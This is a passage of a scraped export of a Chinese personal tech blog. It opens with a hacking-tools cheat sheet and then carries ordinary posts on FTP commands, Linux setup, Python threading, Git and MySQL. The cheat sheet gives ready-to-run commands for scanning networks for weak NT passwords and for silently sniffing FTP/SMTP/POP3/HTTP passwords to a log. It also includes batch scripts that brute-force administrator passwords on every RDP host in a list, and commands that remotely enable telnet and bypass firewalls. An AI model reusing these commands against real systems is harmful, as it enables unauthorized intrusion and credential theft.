检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机 xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机 九： 命令行方式嗅探器: xsniff.exe 可捕获局域网内FTP/SMTP/POP3/HTTP协议密码 参数说明 -tcp 输出TCP数据报 -udp 输出UDP数据报 -icmp 输出ICMP数据报 -pass 过滤密码信息 -hide 后台运行 -host 解析主机名 -addr IP地址 过滤IP地址 -port 端口 过滤端口 -log 文件名 将输出保存到文件 -asc 以ASCII形式输出 -hex 以16进制形式输出 用法示例 xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中 xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出 终端服务密码破解: tscrack.exe 参数说明 -h 显示使用帮助 -v 显示版本信息 -s 在屏幕上打出解密能力 -b 密码错误时发出的声音 -t 同是发出多个连接（多线程） -N Prevent System Log entries on targeted server -U 卸载移除tscrack组件 -f 使用－f后面的密码 -F 间隔时间（频率） -l 使用－l后面的用户名 -w 使用－w后面的密码字典 -p 使用－p后面的密码 -D 登录主页面 用法示例 tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码 tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户 @if not exist ipcscan.txt goto noscan @for /f “tokens=1 delims= “ %%i in (3389.txt) do call hack.bat %%i nscan @echo 3389.txt no find or scan faild (①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt) 3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat @if not exist tscrack.exe goto noscan @tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt :noscan @echo tscrack.exe no find or scan faild (②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了) hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。 其它 Shutdown.exe Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。） fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙） fpipe -l 80 -s 1029 -r 80 当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息 Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。 OpenTelnet.exe (远程开启telnet工具) opentelnet.exe IP 帐号 密码 ntlm认证方式 Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet ip 连接上对方。 NTLM认证方式：0：不使用NTLM身份验证；1：先尝试NTLM身份验证，如果失败，再使用用户名和密码；2：只使用NTLM身份验证。 ResumeTelnet.exe (OpenTelnet附带的另一个工具) resumetelnet.exe IP 帐号 密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。 FTP命令详解 FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。 FTP的命令行格式为： ftp -v -d -i -n -g [主机名] ，其中 -v 显示远程服务器的所有响应信息 -n 限制ftp的自动登录，即不使用；.n etrc文件； -d 使用调试方式； -g 取消全局文件名。 FTP使用的内部命令如下(中括号表示可选项): 1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip 2.$ macro-ame[args]： 执行宏定义macro-name。 3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。 4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。 5.ascii：使用ascii类型传输方式。 6.bell：每个命令执行完毕后计算机响铃一次。 7.bin：使用二进制文件传输方式。 8.bye：退出ftp会话过程。 9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。 10. cd remote-dir：进入远程主机目录。 11.cdup：进入远程主机目录的父目录。 12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。 13.close：中断与远程服务器的ftp会话(与open对应)。 14 .cr：使用asscii方式传输文件时，将回车换行转换为回行。 15.delete remote-file：删除远程主机文件。 16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。 17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。 18.disconnection：同close。 19.form format：将文件传输方式设置为format，缺省为file方式。 20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。 21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。 22.hash：每传输1024字节，显示一个hash符号(#)。 23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。 24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。 25.image：设置二进制传输方式(同binary)。 26.lcd[dir]：将本地工作目录切换至dir。 27. ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。 28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。 29.mdelete[remote-file]：删除远程主机文件。 30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir .o..zipoutfile 。 31.mget remote-files：传输多个远程文件。 32.mkdir dir-name：在远程主机中建一目录。 33.mls remote-file local-file：同nlist，但可指定多个文件名。 34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。 35.modtime file-name：显示远程主机文件的最后修改时间。 36.mput local-file：将多个文件传输至远程主机。 37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。 38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。 39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。 40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。 41.open host[port]：建立指定ftp服务器连接，可指定连接端口。 42.passive：进入被动传输方式。 43.prompt：设置多个文件传输时的交互提示。 44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。 45.put local-file[remote-file]：将本地文件local-file传送至远程主机。 46.pwd：显示远程主机的当前工作目录。 47.quit：同bye，退出ftp会话。 48.quote arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst. 49.recv remote-file[local-file]：同get。 50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。 51.rhelp[cmd-name]：请求获得远程主机的帮助。 52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。 53.rename[from][to]：更改远程主机文件名。 54.reset：清除回答队列。 55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。 56.rmdir dir-name：删除远程主机目录。 57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。 58.send local-file[remote-file]：同put。 59.sendport：设置PORT命令的使用。 60.site arg1，arg2…：将参数作为SITE命令逐字发送至远程ftp主机。 61.size file-name：显示远程主机文件大小，如：site idle 7200。 62.status：显示当前ftp状态。 63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。 64.sunique：将远程主机文件名存储设置为只一(与runique对应)。 65.system：显示远程主机的操作系统类型。 66.tenex：将文件传输类型设置为TENEX机的所需的类型。 67.tick：设置传输时的字节计数器。 68.trace：设置包跟踪。 69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。 70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3 71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。 72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on. 73.?[cmd]：同help.","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[]},{"title":"把Linux给我我就能用！","slug":"把Linux给我我就能用！","date":"2019-04-03T15:11:35.000Z","updated":"2020-02-13T03:25:22.390Z","comments":true,"path":"archives/7ef58b2f.html","link":"","permalink":"https://cxpeng.cn/archives/7ef58b2f.html","excerpt":"","text":"原本以为这个世界只有Windows，后来才发现竟然有Linux这个妖怪，还得需要学习使用，想起天下无贼有一段范伟扮演的强盗不懂IQ是什么，说只要给他密码他就能用。学习一个新的知识，不就是拿来使用嘛，所以秉着这个思想，便开始踩坑！ 首先考虑怎么安装，踩坑第一步： 安装虚拟机。现在Windows还是办公的主力，幻灯片和Word文档，还有许多工具软件，使用macOS 都不可替代，装个虚拟机还是挺好的解决方案，在家有条件了可以买个主机安装linux系统后当做一个服务器，现阶段就还是用虚拟机。 虚拟机安装：下载：VMware官网，选择版本下载Workstations Pro，然后一步步按照提示安装，最后网上收一下授权密钥。 选择Linux发行版 Ubuntu：选择桌面版本对比win，使用习惯改一下就行，不会让人难接受 CentOS：我安装最小安装版本，之后在Windows软件中通过ssh访问就行。 原本选择的是centOS.不过后来出了挺多问题，就换回Ubuntu使用，不过桌面还是比字符界面慢好多，但是还是那句话用ssh工具软件远程登录就行，不影响。 下载 可以去一些镜像网站下载，比如我们学校的镜像网站校园网，速度挺快，之前也去过交大下过，也可以去中科大、清华下载相应的版本。 具体怎么安装，打开虚拟机-创建虚拟机-找到镜像文件-下一步-填写一个用户名方便登录使用-配置硬件等-安装。基本是按照一步步走下来不需要具体设置 这里设置时候有时会牵扯到日后想把文件或者文字在虚拟机和主机之间传递，需要在虚拟机-设置-添加CD/DVD，选择自动检测。一般就可以粘贴了，或者什么都不用设置，以后在远程端操作也行。 设置网络 要让虚拟机运行起来怎么能够忘了配置网络呢。 打开虚拟机-设置-网络适配器：网络连接提供三种连接方式，由于我们是在主机联网的情况，所以选择NAT模式，通过主机联网，具体三种的区别，出现问题时再去探究。 这时候我们Linux使用的是我们Windows中的VMnet8，所以和主机是处在一个网段的。 使用ifconfig可查看Linux中的IP地址，在Windows中ping以下，看看能不能接通，好为下一步进行操作做准备。 好了前面坑比较少，真正的坑在慢慢到来。第一个远程连接，不是你给我密码我就能用的！！！ 怎么下载安装SecureCRT点击参考安装破解 开始通过ssh连接了，刚开始我使用quick connect发现linux拒绝我的请求，不对啊，我查看了虚拟机和主机ping过了。后来百度发现是Linux 中ssh没有安装，感觉去Linux中安装，但是安装时，也给我提示Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?好了，这个原因说明我们需要更换Linux的软件源，既然自带的源不好使，还在国外速度慢，那就用我们自己的，前面提到清华源正好用上 安装ssh 12安装openssh-client3sudo apt-get install openssh-client45安装openssh-server6sudo apt-get install openssh-server7验证ssh服务开启8ps -A|grep ssh9没有开启的话就开启：10sudo service sshd start 替换Linux中的软件源 Linux中所有的东西都可以通过修改文件来实现，更改源这种小事情当然是一样 1切换目录2cd /etc/apt/3备份一下4sudo cp sources.list copy_sources.list5进行编辑把下面的清华的源加进去6deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted7deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted8deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial universe9deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates universe10deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial multiverse11deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates multiverse12deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse13deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted14deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security universe15deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security multiverse1617最后更新下：18sudo apt-get update 这时候还不能用再加下面：1sudo vim /etc/resolv.conf2添加下面内容3nameserver 8.8.8.84nameserver 223.5.5.55nameserver 223.6.6.66 最后更新一下：7sudo apt-get update这时候填坑完毕。 打开Windows中的SecureCRT，file-quick connect，填写username，密码，之后记住密码，这时候就可以在软件中操作Linux系统。Linux使用命令学习","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://cxpeng.cn/tags/Linux/"}]},{"title":"360在线笔试编程题","slug":"360在线笔试编程题","date":"2019-04-03T13:48:58.000Z","updated":"2020-02-13T03:21:25.229Z","comments":true,"path":"archives/749620d3.html","link":"","permalink":"https://cxpeng.cn/archives/749620d3.html","excerpt":"","text":"前一段时间，申请了360公司的机器学习实习生，今天进行了在线能力测评和在线笔试。其中早晨做的能力测试，数理题和逻辑题个15个，总共30min，题目没做完，中午和师哥他们聊起来，他们给的建议总结来说就是：能力测评，其中第一感觉也是能力的一种。题目还是不算难，有点初中生做小学奥数的感觉。 晚上7-9点是在线笔试时间，分为客观题40个和编程题3个，共80分，由于是机器学习岗位，所以前一部分是数理统计和机器学习的基础知识，后面是数据结构与算法的题，还有些Python和C++的程序题，感觉和考计算机三级差不多。 记得考的内容有： 动态规划 prim算法 度量指标 指数平滑法 模板类 抽象类 广义表 栈等 从做题的情况来说，C++要好好掌握，数据结构要理解透侧，机器学习要多分析算法之间的关系，多思考使用的那些细节指标。 最后是三道编程题： 1、最近一款吃鸡类型的游戏火爆全球。在组队模式下，你可以邀请自己的好友组建自己的小队，并选择是否填充（是否同意和非好友游玩），然后加入游戏。现在有A个单人队伍，B个双人队伍，C个三人队伍，D个四人队伍，并且全都同意填充，请问最多能组成多少个四人队伍。 输入 第一行一个正整数T，表示数据组数。（1≤T≤100） 接下来T行，每行四个非负整数，A，B，C，D。（0≤A, B, C, D≤150） 输出 共T行，每行输出一个队伍数。 样例输入 4 1 2 3 4 4 3 2 1 2 2 2 1 0 2 0 1 样例输出 6 5 4 2 2、给定一个长度为N的序列A1到AN，现在要对序列进行M次操作，每次操作对序列的前若干项进行升序或降序排列，求经过这M次操作后得到的序列。 输入第一行包含两个整数N和M，1≤N，M≤105。 第二行包含N个空格隔开的整数A1到AN，1≤Ai≤109。 接下来M行，每行包含两个整数t和x，0≤t≤1，1≤x≤N。若t=0，则表示对A1到Ax进行升序排列；若t=1，则表示对A1到Ax进行降序排列。操作执行顺序与输入顺序一致。 输出 输出N个空格隔开的整数，即经过M次操作后得到的序列。 样例输入 4 2 1 2 4 3 1 3 0 2 样例输出 2 4 1 3 3、给定一个1到N的排列A1到AN，每次可以将排列的第一个数移到排列的末尾，假设经过若干次移动后得到排列B1到BN，那么|B1-1|+|B2-2|+|B3-3|+…+|BN-N|的最小值是多少？ 样例解释 经过两次移动后得到排列{1 5 2 4 3}，此时|B1-1|+|B2-2|+|B3-3|+|B4-4|+|B5-5|取得最小值。 输入第一行包含一个整数N，1≤N≤105。 第二行包含N个空格隔开的整数A1到AN。 输出 输出|B1-1|+|B2-2|+|B3-3|+...+|BN-N|的最小值。 样例输入 5 4 3 1 5 2 样例输出 6","categories":[{"name":"生活随笔","slug":"生活随笔","permalink":"https://cxpeng.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"编程","slug":"编程","permalink":"https://cxpeng.cn/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"5G终端协同场景下的通信系统技术","slug":"5G","date":"2019-04-03T13:48:58.000Z","updated":"2020-02-13T03:23:43.900Z","comments":true,"path":"archives/60bf0728.html","link":"","permalink":"https://cxpeng.cn/archives/60bf0728.html","excerpt":"","text":"【整理】5G终端协同场景下通信性能分析以及优化策略研究由于无线移动通信的不断发展，落地的新兴产业应用使得，用户对于网络的传输速率、时延、吞吐量有了更高的要求。——-新一代移动通信技术5G。 所谓用户体验：网速快，时延低，通信可靠，传输距离远等， D2D ，一定范围内的用户进行直接通信，不需要基站的转接， 我们的D2D技术和中继技术的D2D辅助中继通信技术，可以使得用户UE作为中继，来辅助用户-用户、用户-基站进行通信。 用户到网络中继技术UE-to-Network Relay。 借助用户用户间的近距离通信，特定用户可以作为中继来辅助其他用户与基站之间的通信交互传输，使得小区边缘用户获得良好的连接体验。 上面解决了小区边缘用户进行快速通信传输的问题，但是针对密集节点的部署带来的网络能耗高的问题，可以从传输链路入手解决。 上面提到的用户网络中继技术，在扩展小区服务范围和提升用户体验上面有显著的成效，但是在用户数量急剧增加的情况下，回城链路的压力是很大的，所以考虑使用内容缓存技术，减少数据的流量。所以联合两种技术来分析5G终端协同通信场景下的性能。 最后要达到的目的，降低用户的功耗情况下，同时降低中断概率等。 一、移动通信技术的发展 20`80，1G，频分多址，模拟通信 20`90，2G，时分多址，数字语音通信 21初，3G，码分多址， 4G，正交频分多址技术，两种调制方式TD-LTE，FDD-LTE 然后通过发展的背景来看，通信系统的链路性能已经接近香农极限 5G出现，对应高速率、高容量、高可靠、低时延 应用场景：eMBB增强移动宽带、mMTC大规模机器通信、超高可靠低时延通信uRLL。 5G终端协同场景TCS：指的是用户侧的若干个终端设备之间互为协同关系。充分发挥网络与终端协同融合带来的服务能力的提升。 在以前主要是考虑在基站侧，通过设计超密集异构网络，来提高频谱效率，但是对于移动运营商来说，需要考虑大部分用户的需求，并能够保证网络分配合理统一，所以D2D技术就是为了应对移动用户的激增，依靠终端侧设备之间的特点、优势和限制，合理分配资源和选择缓存策略，来提高频谱利用效率，实现绿色高效的通信。二、D2D技术传统蜂窝网络系统采用的是基站为中心的覆盖形式，任何用户之间的通信必须经过基站转接。D2D技术可以依靠用户位置的分布，允许一定范围内的特性用户之间进行通信。 简单D2D通信，终端之间距离较近 中继用户辅助D2D通信，终端之间距离比较远的时候，选择特性用户作为中继用户 中继用户辅助蜂窝通信，将D2D对中的其中一个用户作为中继，让另一个用户来和基站进行通信。 D2D协同通信，若干个终端通过D2D技术进行建立自组织网络，互相进行数据传输 1、为了提升移动通信系统的整体性能，可以在发送端和接收端中间增加中继节点，中继用户辅助蜂窝网络技术利用特定条件的用户作为中继节点，这种技术虽然提升了整体性能，但是也增加了能耗，因此需要采用合理的策略来管理中继节点的资源分配、节点选择等。 按功能： 层一中继：只是简单的将接受的信号进行放大转发，但是噪声会随着有用的信号一同放大 层二中继：解码转发中继，对接收的信号进行解调解码处理，复杂度高，处理时延，但是噪声控制好。 层三中继：有完整的无线资源控制层、介质访问控制层、物理层，可以当做低功率的基站。 2、通信模式选择算法： 基于链路质量：若D2D用户之间的链路质量（信号强度、速率）高于蜂窝链路，就采用D2D直接通信 基于距离：考虑长期平均链路质量可以简化为距离，当D2D用户之间距离小于某一阈值时，就采用D2D直接通信 基于位置：中心区域和边缘区域 需要解决的问题中继节点的选择问题、资源分配问题。（中继节点一般电量充足、与基站的链路稳定、存储能力强、有一定计算处理能力等）三、内容缓存未来5G应用场景下，会由点与点通信发展到接收海量数据，因此5G系统下系统的容量至少提升1000倍。在云计算与5G相结合的今天，可以通过基于缓存技术的移动边缘计算，对用户请求的内容流行性进行分析和预测，将重复请求的内容放在移动网络边缘节点中，从而降低业务时延，减轻回程链路的负载压力。说的好理解点，就是用户在请求网络资源的时候，大部分是集中在流行度较高的热门内容，通过分析用户请求，将这些热门内容文件提前缓存或者动态缓存在网络中。这样可以缓解下行链路的负载、降低响应时延。 内容缓存技术分类： 终端缓存：降低用户功耗，可以直接从自身设备或者周边智能设备获取缓存文件，无须与基站进行连接；减少基础设施的建设；减轻回程负载压力 基站缓存：降低回程链路带宽需求。 目前的缓存技术： 等概率随机缓存EPRC：命中率低 流行文件缓存策略MPC：丰富度低。过度冗余。 四、随机集合理论： 传统的蜂窝均匀分布模型，被验证不适用于当今节点随机分布且不均匀的现代移动通信网络。 点过程可以指区域中随机分布的点的集合，在满足一定随机分布过程的情况用来表示网络拓扑结构。 利用随机几何理论对通信网络进行建模分析。可以使用的是随机集合理论可以较好的建模蜂窝网络中基站随机分布特点，通过在二维平面上做统计平均，推导出相关网络性能指标的数学表达式。 五、基于随机几何的系统建模","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"D2D","slug":"D2D","permalink":"https://cxpeng.cn/tags/D2D/"}]},{"title":"Python中的多线程","slug":"Python中的多线程","date":"2019-04-02T10:50:37.000Z","updated":"2020-02-13T03:24:11.555Z","comments":true,"path":"archives/949db3a1.html","link":"","permalink":"https://cxpeng.cn/archives/949db3a1.html","excerpt":"","text":"多线程、多进程 概念 进程：计算机中需要执行的任务称之为进程，比如浏览器的运行、播放音乐。可以通过fork和spawn派生出新的进程来执行其他任务。进程间通过进程间通信方式进行通信。 线程：进程中，需要完成的一个多个任务称之为线程，共享相同的上下文，被称之为迷你进程。比如播放音乐中需要输出歌词和音频。同一进程下线程间时共享数据空间。 让步：线程中有指令指针，当其他的线程进行时，指针可以被抢占和挂起。 竞态条件：多个线程访问同一片数据，访问顺序不同可能造成的结果不同。 进程和线程都是执行多任务的实现方法。 实现多任务的方式 采用以下三种方式： 多进程 多线程 多进程中多线程（较为复杂，使用较少） 多线程的适用类型 适用于的任务类型： 本质是异步 多个并发 根据应用需求，执行顺序不确定 根据应用的不同，子任务可能需要先运算出中间结果，在合并为最终结果。 计算密集型/IO密集型 计算密集型任务的特点是要进行大量的计算，消耗CPU资源，靠CPU的运算能力。这种任务一般需要高效利用CPU，对于代码的执行效率要求很高，可以设置同时进行的任务数为CPU的核心数。 IO密集型，涉及到网络、磁盘IO的任务，这种任务的大部分时间都在等待IO操作完成（因为IO的速度远远低于CPU和内存的速度）。对于IO密集型任务，任务越多，CPU效率越高，但也有一个限度。常见的大部分任务都是IO密集型任务，比如Web应用。对于IO密集型任务，最合适的语言就是开发效率最高（代码量最少）的语言，脚本语言是首选，C语言最差。 在Python中由于代码是在Python虚拟机中执行（解释器主循环），而主循环中只允许同时只有一个线程运行，对虚拟机的访问时利用全局解释器锁GIL控制的，所以在Python中多线程更适合IO密集型任务。 多线程能提高系统的性能 通过适用多线程编程可以通过将复杂问题简化，比如将编程任务规划成几个特定函数的线程。个线程之间功能明确、清晰。 UserRequestThread：读取输入 RequestProcessor：根据输入处理请求 ReplyThread：向用户输出 Python解释器执行流程： 设置GIL 切换到一个线程执行 指定数量的字节码指令 线程让出控制权time.sleep() 切换出线程 解锁GIL 重复以上步骤 _thread、threadingPython中实现多线程使用到的模块为_thread和threading模块，Python核心编程中建议使用threading，他们之间的差别是： 前者更为底层基础，后者功能更加丰富，有着更多的同步原语可供操作 前者对于进程何时退出没有控制，当主线程结束时，其他线程也将结束，并没有警告；后者能够保证重要的子线程在进程退出前结束 前者不支持守护进程daemon，所谓的守护进程通常是指的一些不重要的进程一般是等待客户端请求服务的服务器，当主线程想要结束，不需要等待子线程的结束，那么可以吧这些线程设置为守护进程。 其实Python3中都把thread改为_thread了，也就是建议用户尽量使用threading模块了。 多线程应用编程中可能需要使用的模块： _thread threading multiprocessing subprocess Queue mutex：互斥对象 concurrent.futures SocketServer：创建/管理线程控制的TCP/UDP服务器 threading中的对象 Thread Lock RLock Condition Event Timer Semaphore：为线程间共享的有限资源提供一个“计数器”，没有可用资源时被阻塞 BoundedSemaphore：与上面不同的是不允许超过初始值 Barrier：创建一个“障碍”，必须达到指定数量线程后才能继续 Thread类 name ident daemon：守护进程的标识 start() run()：定义线程功能的方法。创建子类时，被用户重写 join() init (group=None, target= None, name=None,args=None,kwargs={}, verbose=None,daemon=None) 使用Thread类，来创建线程的方式： 创建Thread实例，并向它传入一个函数 创建Thread实例，并向它传递可调用的类实例 派生Thread的子类，并创建子类的实例 上面三种一般是采用第一种和第三种，第三种更加符合面向对象的接口设计。","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://cxpeng.cn/tags/Python/"},{"name":"多线程","slug":"多线程","permalink":"https://cxpeng.cn/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"}]},{"title":"怎么样使用Git？","slug":"怎么样使用Git？","date":"2019-03-31T13:07:41.000Z","updated":"2020-02-13T03:25:14.244Z","comments":true,"path":"archives/7fd01c5b.html","link":"","permalink":"https://cxpeng.cn/archives/7fd01c5b.html","excerpt":"","text":"什么是Git？首先一个问题就是：什么是Git？用来干什么？ 维基百科中是这么说的：Git是一种分布式版本控制软件。Git是用C语言开发的，追求高性能，它的TCP监听端口是9418，刚开始是用于Linux内核开发的版本控制，不需要服务器端软件，就可以运作版本控制软件，使得源代码的发布和交流极为方便。 Git中的数据结构 可变的索引 不可变的、仅追加的对象数据库 下面总结下常用的基本语法 基本使用方法使用之前需要先安装，附官网地址：https://www.git-scm.com/download/ 使用Git，要知道什么是工作区、暂存区、版本库。本地进行存储的称之为工作区，然后修改文件之后，先将文件add暂存区，暂存区保存未提交的修改，最后将暂存区的修改commit到版本库（之后还需要push远程）。 在windows中安装使用Git，打开Git Bash新建一个空文件夹，用于本地项目的存储，文件夹路径不要使用中文名字。 mkdir xxx：创建文件夹 cd xxx：进入文件夹 git init：文件夹初始化为本地库 修改、添加、提交 vi README.md：新建编辑文档 git add README.md：将本地文档添加入暂存区 git commit -m README.md：提交到版本分支上 git status：查看暂存区状态 git diff README.md：查看修改 查看日志和回退功能 git log：查看提交日志 git reflog：记录所有的操作 git reset —hard HEAD^：版本回退当前版本的上一个版本 git reset —hard id：根据版本号进行回退，版本号可以在log中看到 git checkout — README.md ：当没有进行add时，可以撤销上一版本add或者提交之后的所有修改 git reset HEAD README.md：当这是add之后没有commit，这一步加上一步进行撤销修改 git reset —hard id：当已经commit之后，可以通过回退进行退回到以前版本。 删除操作和误操作解决办法 git rm README.md：删除文档，并告诉暂存区 git commit -m “remove a file”：提交删除信息 git reset —hard HEAD^：撤销修改 git checkout — READMD.md：找回删除的文件 连接、克隆远程库，下面还涉及到连接多个远程库，进行共同管理 git remote add origin git@github.com:Caixp0612/dragon.git：远程连接github上的远程库 git push -u origin master：将本地库推送到远程 git clone git@github.com:Caixp0612/dragon.git：克隆远程库到本地 分支管理 git checkout -b dev：创建并切换分支 git checkout master：切换分支 git branch：查看分支信息 git merge dev：在分支完成修改开发，可以在mater下进行合并 git branch -d dev：当不在分支上进行工作时可以删除分支 git log —graph —pretty=oneline —abbrev-commit：该命令可以看到分支合并情况。 git merge —no-ff -m “merge with no-ff” dev：合并新的分支并禁用fast-forward模式，可以看到分支合并的信息 保存和恢复工作现场 git stash：保存当前工作， git stash list：查看当前保存的工作区 git stash apply stash@{n} 恢复制定的工作区 git stash drop：清空stash内容 git stash pop：恢复同时清空stash内容 git branch -D dev：丢弃未被合并的分支，需要使用参数D 标签管理，通过打标签使得版本更新更清晰 git tag v0.1 commit_id：给指定的ID上标签 git show v0.1：查看标签信息 git tag -a v0.1 -m “xxx”：创建带有说明的标签 git tag -d v0.1：删除标签 git push origin v0.1：将标签推送到远程 git push origin —tags：将全部标签推送到远程 git push origin :refs/tags/v0.9：若已经把标签推送到远程再删除标签的话，先执行本地的删除标签，然后再进行这一步进行远程删除。 连接多个远程库进行管理，需要先将本地.ssh文件夹保存的公钥传到远程平台上，使得可以通过ssh通信 码云 git remote add gitee git@gitee.com:Caixpeng/dragon.git git remote -v git pull gitee master：将远程的库同步到本地，这时候可能会遇到了一个问题就是提示两个库创建历史不一样，这种情况选择忽略，解决方法是在命令后面添加参数 —allow-unrelated—histories，之后就是需要更改合并冲突等一些问题。 git push xxx master：将本地的分支推送到远程，xxx是制定远程库时起的名字 待续 之后可以进行定制化Git，学习Git，从使用入手，之后遇到问题时候在进行补充。 定制化Git可以更改显示颜色，忽略不重要文件，设置别名alias等，设置别名可以在配置文件`.git/config`中进行批量修改。","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://cxpeng.cn/tags/Git/"}]},{"title":"MySQL学习（一）","slug":"MySQL学习（一）","date":"2019-03-26T01:35:17.000Z","updated":"2020-02-13T03:23:54.075Z","comments":true,"path":"archives/42250562.html","link":"","permalink":"https://cxpeng.cn/archives/42250562.html","excerpt":"","text":"什么是SQL?SQL(Structed Query Language)是一种访问和处理数据库的标准的计算机语言。 SQL 面向数据库执行查询 SQL 可从数据库取回数据 SQL 可在数据库中插入新的记录 SQL 可更新数据库中的数据 SQL 可从数据库删除记录 SQL 可创建新数据库 SQL 可在数据库中创建新表 SQL 可在数据库中创建存储过程 SQL 可在数据库中创建视图 SQL 可以设置表、存储过程和视图的权限 什么是MySQL?是一种关系型数据库。可以按照数据结构来组织、存储数据的仓库。是一个免费开源项目，功能强大。 